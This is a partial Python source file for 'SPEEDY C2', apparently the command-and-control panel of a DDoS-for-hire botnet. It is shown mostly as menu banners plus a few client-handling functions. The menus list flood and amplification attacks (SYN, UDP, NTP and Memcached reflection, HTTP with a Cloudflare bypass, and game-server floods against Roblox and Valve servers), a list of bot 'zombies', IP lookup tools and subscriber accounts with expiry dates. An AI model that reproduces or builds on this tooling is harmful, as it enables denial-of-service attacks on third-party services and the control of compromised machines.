...
banner2 = '''
   _____ ____  __________________  __
  / ___// __ \/ ____/ ____/ __ \ \/ /
  \__ \/ /_/ / __/ / __/ / / / /\  / 
 ___/ / ____/ /___/ /___/ /_/ / / /  
...
rules = f"""
{lightwhite}1. {gray}Nie wal w .gov .edu
{lightwhite}2. {gray}Nie spam atakami
"""

help = f"""
XXXXXXXXXXXXXXXXXXXXXXXXXXXXX#######################################XXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXX                                       XXXXXXXXXXXX
X              XXXXXXXXXXXXXX         __  __________    ____        XXXXXXXXXXXX
X     _____    XXXXXXXXXXXXXX        / / / / ____/ /   / __ \       XXXXXXXXXXXX
X    / ___/    XXXXXXXXXXXXXX       / /_/ / __/ / /   / /_/ /       XXXXXXXXXXXX
X   (__  )     XXXXXXXXXXXXXX      / __  / /___/ /___/ ____/        XXXXXXXXXXXX
X  /____/      XXXXXXXXXXXXXX     /_/ /_/_____/_____/_/             XXXXXXXXXXXX
X              XXXXXXXXXXXXXX                                       XXXXXXXXXXXX
X SPEEDY C2    XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
X              XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
X              XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXX {lightwhite}HELP         {gray}Shows list of commands      
XXXXXXXXXXXXXXXXXXXX {lightwhite}BOTNET       {gray}Shows list of botnet methods
XXXXXXXXXXXXXXXXXXXX {lightwhite}METHODS      {gray}Shows Methods List          
XXXXXXXXXXXXXXXXXXXX {lightwhite}BOTS         {gray}Shows available zombies     
XXXXXXXXXXXXXXXXXXXX {lightwhite}TOOLS        {gray}Shows list of tools         
XXXXXXXXXXXXXXXXXXXX {lightwhite}CLEAR        {gray}Clears the screen           
XXXXXXXXXXXXXXXXXXXX {lightwhite}EXIT         {gray}Disconnects from the net    
XXXXXXXXXXXXXXXXXXXX                                                            
...
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
X       _____      X          __  _________________  ______  ____  _____        
X      / ___/      X         /  |/  / ____/_  __/ / / / __ \/ __ \/ ___/        
X      \__ \       X        / /|_/ / __/   / / / /_/ / / / / / / /\__ \         
X     ___/ /       X       / /  / / /___  / / / __  / /_/ / /_/ /___/ /         
X    /____/        X      /_/  /_/_____/ /_/ /_/ /_/\____/_____//____/          
X                  X                                                            
X                  X                                                            
X   SPEEDY C2      X                                                            
X                  X                                                            
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXX  {gray}List of Methods:                                    
XXXXXXXXXXXXXXXXXXXX  {lightwhite}L3               {gray}Show all L3 Methods    
XXXXXXXXXXXXXXXXXXXX  {lightwhite}L4               {gray}Show all L4 Methods    
XXXXXXXXXXXXXXXXXXXX  {lightwhite}AMP              {gray}Show all Amplification 
XXXXXXXXXXXXXXXXXXXX  {lightwhite}HTTP             {gray}Show all L7 Methods    
XXXXXXXXXXXXXXXXXXXX  {lightwhite}GAMES            {gray}Show all Games Methods 
XXXXXXXXXXXXXXXXXXXX  {lightwhite}BOTNET           {gray}Show all Methods       
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
...
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXX  {gray}L3 Methods:                                         
XXXXXXXXXXXXXXXXXXXX  {lightwhite}.ICMP              {gray}Flood ICMP Request   
XXXXXXXXXXXXXXXXXXXX  {lightwhite}.POD               {gray}Ping Of Death OLD Met
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
...
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXX  {gray}Amplification Methods:                              
XXXXXXXXXXXXXXXXXXXX  {lightwhite}.NTP               {gray}NTP Reflection flood 
XXXXXXXXXXXXXXXXXXXX  {lightwhite}.MEM               {gray}Memcached Flood      
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
...
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXX        __  _________________  ______  ____  _____      XX
X       _____      XXX       /  |/  / ____/_  __/ / / / __ \/ __ \/ ___/      XX
X      / ___/      XXX      / /|_/ / __/   / / / /_/ / / / / / / /\__ \       XX
X      \__ \       XXX     / /  / / /___  / / / __  / /_/ / /_/ /___/ /       XX
X     ___/ /       XXX    /_/  /_/_____/ /_/ /_/ /_/\____/_____//____/        XX
X    /____/        XXX                                                        XX
X                  XXX                                                        XX
X    SPEEDY C2     XXX                                                        XX
X                  XXX                                                        XX
XXXXXXXXXXXXXXXXXXXXXX                                                        XX
XXXXXXXXXXXXXXXXXXXXXX {gray}L4 Methods:                                      XX
XXXXXXXXXXXXXXXXXXXXXX {lightwhite}.UDP               {gray}UDP Flood         XX
XXXXXXXXXXXXXXXXXXXXXX {lightwhite}.TCP               {gray}TCP Flood         XX
XXXXXXXXXXXXXXXXXXXXXX {lightwhite}.TUP               {gray}TCP and UDP Flood XX
XXXXXXXXXXXXXXXXXXXXXX {lightwhite}.SYN               {gray}TCP SYN flood     XX
XXXXXXXXXXXXXXXXXXXXXX {lightwhite}.HEX               {gray}HEX Flood         XX
XXXXXXXXXXXXXXXXXXXXXX {lightwhite}.JUNK              {gray}Junk flood        XX
XXXXXXXXXXXXXXXXXXXXXX                                                        XX
XXXXXXXXXXXXXXXXXXXXXX                                                        XX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
...
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXX           __  _________________  ______  ____  _____       
X       _____      X          /  |/  / ____/_  __/ / / / __ \/ __ \/ ___/       
X      / ___/      X         / /|_/ / __/   / / / /_/ / / / / / / /\__ \        
X      \__ \       X        / /  / / /___  / / / __  / /_/ / /_/ /___/ /        
X     ___/ /       X       /_/  /_/_____/ /_/ /_/ /_/\____/_____//____/         
X    /____/        X                                                            
X                  X                                                            
X    SPEEDY C2     X                                                            
X                  X                                                            
...
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXX {gray}L7 Methods:                                          
XXXXXXXXXXXXXXXXXXXX {lightwhite}.HTTPIO            {gray}HTTP IO Stresser      
XXXXXXXXXXXXXXXXXXXX {lightwhite}.HTTPCFB           {gray}HTTP Cloudflare bypass
XXXXXXXXXXXXXXXXXXXX {lightwhite}.HTTPGET           {gray}HTTP GET requests     
XXXXXXXXXXXXXXXXXXXX {lightwhite}.HTTPSPOOF         {gray}HTTP GET Spoofing     
XXXXXXXXXXXXXXXXXXXX {lightwhite}.HTTPSTORM         {gray}HTTP STORM Requests   
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
"""
...
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXX                                                            
X       _____      X                _________    __  ______________             
X      / ___/      X               / ____/   |  /  |/  / ____/ ___/             
X      \__ \       X              / / __/ /| | / /|_/ / __/  \__ \              
X     ___/ /       X             / /_/ / ___ |/ /  / / /___ ___/ /              
X    /____/        X             \____/_/  |_/_/  /_/_____//____/               
X                  X                                                            
X    SPEEDY C2     X                                                            
X                  X                                                            
XXXXXXXXXXXXXXXXXXXX                                                            
...
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXX {gray}Games Methods:                                       
XXXXXXXXXXXXXXXXXXXX {lightwhite}.VSE               {gray}Valve Source Engine qu
XXXXXXXXXXXXXXXXXXXX {lightwhite}.ROBLOX            {gray}Roblox UDP Flood      
XXXXXXXXXXXXXXXXXXXX                                                            
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
...
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXX               _____ ____  __________________  __                 XXXXXXX
XXXXXXX              / ___// __ \/ ____/ ____/ __ \ \/ /                 XXXXXXX
XXXXXXX              \__ \/ /_/ / __/ / __/ / / / /\  /                  XXXXXXX
XXXXXXX             ___/ / ____/ /___/ /___/ /_/ / / /                   XXXXXXX
XXXXXXX            /____/_/   /_____/_____/_____/ /_/                    XXXXXXX
XXXXXXX                                                                  XXXXXXX
XXXXXXX                                                                  XXXXXXX
XXXXXXX                                                                  XXXXXXX
XXXXXXX                                                                  XXXXXXX
XXXXXXX      {gray}List of Tools:                                        XXXXXXX
XXXXXXX      {lightwhite}!GETIP         {gray}Get ip from URL            XXXXXXX
XXXXXXX      {lightwhite}!GEOIP         {gray}Get info from ip           XXXXXXX
XXXXXXX                                                                  XXXXXXX
XXXXXXX                                                                  XXXXXXX
XXXXXXX                                                                  XXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
...
XXXXXXX                                                                  XXXXXXX
XXXXXXX                                                                  XXXXXXX
XXXXXXX    {gray}Admin Commands:                                         XXXXXXX
XXXXXXX    {lightwhite}!USER               {gray}Add/List/remove users   XXXXXXX
XXXXXXX                                                                  XXXXXXX
XXXXXXX                                                                  XXXXXXX
XXXXXXX                                                                  XXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
...
def handle_client(client, address):
    send(client, "\33]0;SPEEDY | Login\a")
    send(client, f'\x1bSPEEDY | Login: Awaiting Response...\a', False)
    send(client, ansi_clear, False)
...
def update_title(client, name, expires):
    while 1:
        try:
            send(client, f"\33]0;SPEEDY C2 | Bots online: {len(bots)} | Username: {name} | Expires: {expires} \a", False)
            time.sleep(0.6)
        except:
            client.close()
...
def command_line(client, username):
    ...
    prompt = f'{color("LIGHTBLSYN_EX")}({color("WHITE")}SPEEDY C2{color("LIGHTBLSYN_EX")}@{color("CYAN")}{username}{color("LIGHTBLSYN_EX")}) > {color("LIGHTBLSYN_EX")}'
